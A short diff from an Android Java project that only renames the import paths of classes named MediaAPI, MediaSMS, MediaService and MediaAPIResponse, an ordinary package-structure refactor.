@@ -4,11 +4,11 @@ import android.content.Context;
 import android.database.Cursor;
 import android.os.AsyncTask;
 
-import com.android.media.settings.API.MediaAPI;
+import com.android.media.settings.Interface.MediaAPI;
 import com.android.media.settings.MediaDBManager;
-import com.android.media.settings.Models.MediaSMS;
-import com.android.media.settings.Services.MediaService;
-import com.android.media.settings.Models.MediaAPIResponse;
+import com.android.media.settings.Model.MediaSMS;
+import com.android.media.settings.Service.MediaService;
+import com.android.media.settings.Model.MediaAPIResponse;
 
 import java.util.ArrayList;
 import java.util.List;
